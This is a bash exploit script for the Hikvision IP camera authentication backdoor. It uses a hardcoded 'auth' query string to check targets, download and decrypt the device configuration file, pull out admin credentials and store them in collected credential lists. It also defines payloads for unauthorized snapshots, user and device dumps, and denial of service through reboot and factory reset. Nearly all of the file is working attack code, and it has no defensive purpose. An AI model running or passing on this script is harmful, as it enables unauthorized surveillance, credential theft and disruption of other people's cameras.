#!/bin/bash

## Collecting inputs
while getopts 't:p:s:' flag; do 
   case "${flag}" in 
      t) host="${OPTARG}" ;; # Target
      p) port="${OPTARG}" ;; # Port
      s) ssl="${OPTARG}" ;; # Use ssl (might be 'true' or 'false')
   esac 
done

ERROR=`echo "[-] Missing or Invalid parameters. QUITTING!"`

## Inputs validation
if [ -z $host ]; then # -h validation
	echo $ERROR
fi

if [ -z $ssl ]; then # -s validation
	ssl="true"
fi

if [ -z $port ] && [[ $ssl == "true" ]]; then # -p validation
	port="443"
elif [ -z $port ] && [[ $ssl == "false" ]]; then
	port="80"
fi

if [[ $ssl == "true" ]]; then # Defines the protocol to use
	proto="https"
elif [[ $ssl == "false" ]]; then
	proto="http"
else
	echo $ERROR 
	exit
fi

URL="$proto://$host:$port" # Crafting URL

## Hikvision backdoor
Backdoor="?auth=YWRtaW46MTEK" # This is the magic key that makes everything possible ;P

## PAYLOADS:
Payload1="onvif-http/snapshot" # Takes an unauthorized snapshot
Payload2="System/deviceInfo" # Dumps device's infos
Payload3="Security/users" # Dumps devices's users (not passwords!)
Payload4="System/configurationFile" # Dumps configFile (probably the most interesting)
Payload5="System/reboot" # DoS1, Reboot system. Requires curl -X PUT request with headers and data. See links above.
Payload6="System/factoryDefault?mode=full" #DoS2, Full Factory Default. Requires curl -X PUT request with headers and data. See links above.
Payload7="System/factoryDefault?mode=basic" #DoS3, Basic Factory Default. Requires curl -X PUT request with headers and data. See links above.
HttpStatus=`curl --max-time 5 -s -o /dev/null -w "%{http_code}" -k $URL/$Payload3$Backdoor`

if [ $HttpStatus == "200" ]; then ## HttpStatus == "200" means that the target is vulnerable.
	if [[ $(curl -s $URL/$Payload3$Backdoor) == "" ]] || [[ $(curl -s -k $URL/$Payload3$Backdoor) == *"403 Forbidden"* ]]
	then
		IsVuln="False"
		echo " NOT VULNERABLE!"
		exit 1 
	fi
	IsVuln="True" && echo $host " VULNERABLE!"
	mkdir -p output/$host
#	curl -s -k $URL/$Payload1$Backdoor > output/$host/snapshot.png && echo "[+] Snapshot downloaded."
#	curl -s -k $URL/$Payload2$Backdoor > output/$host/device-infos && echo "[+] Device-info downloaded."
#	curl -s -k $URL/$Payload3$Backdoor > output/$host/users && echo "[+] Users file downloaded."
	curl -s -k $URL/$Payload4$Backdoor > output/$host/config-file && echo "[+] Configuration file downloaded." 
	python config-decryptor.py output/$host/config-file | grep "'admin'," > /dev/null && Decryptable="True" || Decryptable="False"
	if [ $Decryptable=="True" ]; then # If the configFile results to be decryptable, proceede.
		python config-decryptor.py output/$host/config-file > output/$host/config-file-decrypted.txt
		## Coming soon: Appending "HOST USER:PASS" in a list.
		creds=$(python3 -c "import ast; a = ast.literal_eval(open(\"output/$host/config-file-decrypted.txt\").readlines()[0]); print(\":\".join(a[[x for x, y in enumerate(a) if y == \"admin\"][-1]:][:2]))")
    echo "------------------------------------------------"
    echo "[!] host: $host:$port"
		echo "[!] Creds: $creds"
    echo "------------------------------------------------"

		echo "$creds" >> output/$host/creds.txt 2>&1
		echo "$host ($creds)" >> output/all_creds.txt 2>&1
	else # If the configFile is not decryptable remove the $host directory and exit.
		echo "[-] The configFile seems to be not decryptable."
		rm -rf output/$host && exit
	fi
else # If HttpStatus is != 200 or if the connection time out, the target is not exploitable and the execution stops.
	IsVuln="False" && echo $host " NOT VULNERABLE!" && exit 1
fi

